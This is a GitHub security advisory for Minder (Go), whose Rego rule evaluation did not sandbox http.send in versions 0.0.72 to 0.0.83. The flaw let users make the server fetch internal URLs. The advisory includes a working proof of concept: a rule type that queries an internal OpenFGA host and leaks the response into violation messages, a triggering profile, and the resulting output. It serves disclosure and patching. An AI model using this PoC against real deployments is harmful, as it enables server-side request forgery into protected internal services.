# [H] Minder does not sandbox http.send in Rego programs

## Summary
Severity: High
Advisory: GHSA-6xvf-4vh9-mw47
CWE: CWE-830
Ecosystem: Go
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:L/VA:L/SC:H/SI:L/SA:L (CVSS_V4)
Published: 2025-11-20
Source: https://github.com/advisories/GHSA-6xvf-4vh9-mw47
Type: github-advisory

## Affected
- Go: `github.com/mindersec/minder` — affected >=0.0.72 <0.0.84

## Details
### Impact

Minder users may fetch content in the context of the Minder server, which may include URLs which the user would not normally have access to (for example, if the Minder server is behind a firewall or other network partition).

### Patches

https://github.com/mindersec/minder/commit/f770400923984649a287d7215410ef108e845af8

### Workarounds

Users should avoid deploying Minder with access to sensitive resources.  Unfortunately, this could include access to systems like OpenFGA or Keycloak, depending on the deployment configuration.

### References

Sample ruletype:

```yaml
version: v1
type: rule-type
name: test-http-send
display_name: Test that we can call http.send
short_failure_message: Failed http.send
severity:
  value: medium
context:
  provider: github
description: |
  ...
guidance: |
  ....
def:
  in_entity: repository
  rule_schema:
    type: object
    properties: {}
  ingest:
    type: git
    git: {}
  eval:
    type: rego
    violation_format: text
    rego:
      type: constraints
      def: |
        package minder

        import rego.v1

        violations contains {"msg": "Check-execution"}

        resp := http.send({
          "method": "GET",
          "url": "http://openfga:8080/",
          "raise_error": false,
        })

        violations contains {"msg": sprintf("Response: %s", [resp.status])}

        details := sprintf("High score: %s", [resp.body.summary])

        violations contains {"msg": sprintf("Response body: %s", [resp.body]) } if {
          resp.status_code > 0
        }
```

Example policy:

```yaml
version: v1
type: profile
name: Test-HTTP-send
display_name: Test if we can do http.send
context:
  provider: github
alert: "off"
remediate: "off"
repository:
  - type: test-http-send
    def: {}
```

Evaluation results:

```sh
$ minder profile status list -n test-http-send --json
{
  "profileStatus": {
    "profileId": "3b3e0918-4deb-49cc-b4c9-1d1d912cf784",
    "profileName": "Test-HTTP-send",
    "profileStatus": "failure",
    "lastUpdated": "2024-10-31T03:44:01.456359Z"
  },
  "ruleEvaluationStatus": [
    {
      "profileId": "3b3e0918-4deb-49cc-b4c9-1d1d912cf784",
      "ruleId": "c0ebac2c-cfe2-4a98-b0a6-d6971209653e",
      "ruleName": "test-http-send",
      "entity": "repository",
      "status": "failure",
      "lastUpdated": "2024-10-31T03:44:01.456359Z",
      "entityInfo": {
        "entity_id": "a7f7a4bc-4430-4e9a-86a9-ffa026db6343",
        "entity_type": "repository",
        "name": "a-random-sandbox/colorls",
        "provider": "github-app-a-random-sandbox",
        "repo_name": "colorls",
        "repo_owner": "a-random-sandbox",
        "repository_id": "a7f7a4bc-4430-4e9a-86a9-ffa026db6343"
      },
      "details": "Multiple issues:\n* Check-execution\n* Response body: {\"code\": \"undefined_endpoint\", \"message\": \"Not Found\"}\n* Response: 404 Not Found\n",
      "guidance": "....\n",
      "remediationStatus": "skipped",
      "remediationLastUpdated": "2024-10-31T03:44:01.456359Z",
      "ruleTypeName": "test-http-send",
      "ruleDescriptionName": "Test that we can call http.send",
      "alert": {
        "status": "skipped",
        "lastUpdated": "2024-10-31T03:44:01.456359Z"
      },
      "ruleDisplayName": "Test that we can call http.send",
      "releasePhase": "RULE_TYPE_RELEASE_PHASE_ALPHA"
    }
  ]
}
```

## References
- https://github.com/mindersec/minder/security/advisories/GHSA-6xvf-4vh9-mw47
- https://github.com/mindersec/minder/commit/f770400923984649a287d7215410ef108e845af8
- https://github.com/mindersec/minder
